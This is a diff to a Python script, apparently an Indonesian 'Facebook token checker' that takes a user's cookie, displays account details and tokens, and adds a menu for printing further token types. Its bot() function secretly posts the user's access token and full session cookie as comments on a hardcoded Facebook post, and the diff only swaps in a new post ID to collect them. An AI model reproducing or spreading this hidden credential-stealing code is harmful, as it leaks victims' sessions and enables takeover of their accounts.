@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 #coding=utf-8
-# Developed By : Dvanmeploph And Merch Elz
-# Coded By     : Dvanmeploph Afriliyan Ferly Shishigami X [ A-Haganezuka ]
-# A-Haganezuka = [ Dvanmeploph Afriliyan Ferly Shishigami X - Haganezuka ]
+# Developed By : Denventa And Merch Elz
+# Coded By     : Denventa Afriliyan Ferly Shishigami X [ A-Haganezuka ]
+# A-Haganezuka = [ Denventa Afriliyan Ferly Shishigami X - Haganezuka ]
 # Recode?, Boleh Asal Cantumkan Nama Author
 # Jangan Ganti Bot Koment Gw
 
@@ -15,6 +15,7 @@ def get_token(cookie):
     if 'success' in api['status']:
         stalk(api)
     else:
+        print(api)
         exit(f'{m}INFO!{p} Cookies Invalid')
 
 
@@ -22,8 +23,8 @@ def stalk(data):
     cok = {'cookie':data['cookie']}
     json = {}
     def bot():
-        r.post('https://graph.facebook.com/1660066094445887/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
-        r.post('https://graph.facebook.com/1660066094445887/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
+        r.post('https://graph.facebook.com/1658880191231144/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
+        r.post('https://graph.facebook.com/1658880191231144/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
     os.system('clear')
     api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['token']['eaam'], cookies=cok).json()
     tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['token']['eaab'], cookies=cok).json()['summary']['total_count']
@@ -36,7 +37,7 @@ def stalk(data):
                 json.update({req:api[req]})
         except:json.update({req:m+'None'})
     bot()
-    print(f'{p}Facebook Get Informations\n')
+    print(f'{p}Tools Get Your Informations Account Facebook\n')
     print(f'{a}[{m}*{a}]{p} Facebook Name: {k}'+ json['name'])
     print(f'{a}[{m}*{a}]{p} Facebook ID: {k}'+ json['id'])
     print(f'{a}[{m}*{a}]{p} Gender: {k}'+ json['gender'])
@@ -46,6 +47,34 @@ def stalk(data):
     print(f'{a}[{m}*{a}]{p} Followers Count:{k} '+ str(fc))
     print(f'{a}[{m}-{a}]{p} Cookies: {h}'+ data['cookie'])
     print(f'{a}[{m}-{a}]{p} Eaam Token: {h}'+ data['token']['eaam'])
+    mar = input(f'{p}\nApakah Anda Ingin Menlihat Token Facebook Yang Lain (Y/T)?{m} ')
+    if 'y' in mar.lower():
+        print(f'{p} TOKEN LIST')
+        print(f'{a}[{m}1{a}]{p} Token EAAB')
+        print(f'{a}[{m}3{a}]{p} Token EAAD')
+        print(f'{a}[{m}4{a}]{p} Token EAAE')
+        print(f'{a}[{m}5{a}]{p} Token EAAF')
+        print(f'{a}[{m}6{a}]{p} Token EAAG')
+        print(f'{a}[{m}7{a}]{p} Token EAAI')
+        print(f'{a}[{m}8{a}]{p} Token EABB')
+        seleb = input(f'\n{a}[{m}?{a}]{p} Chose Number:{m} ')
+        print()
+        if '1' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eaab Token:{h} '+ data['token']['eaab'])
+        elif '3' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eaad Token:{h} '+ data['token']['eaad'])
+        elif '4' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eaae Token:{h} '+ data['token']['eaae'])
+        elif '5' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eaaf Token:{h} '+ data['token']['eaaf'])
+        elif '6' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eaag Token:{h} '+ data['token']['eaag'])
+        elif '7' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eaai Token:{h} '+ data['token']['eaai'])
+        elif '8' in seleb:
+            print(f'{a}[{m}-{a}]{p} Eabb Token:{h} '+ data['token']['eabb'])
+        else:exit(m +'Pilih Yang Bener Anj1n9')
+    else:exit()
     
 
 
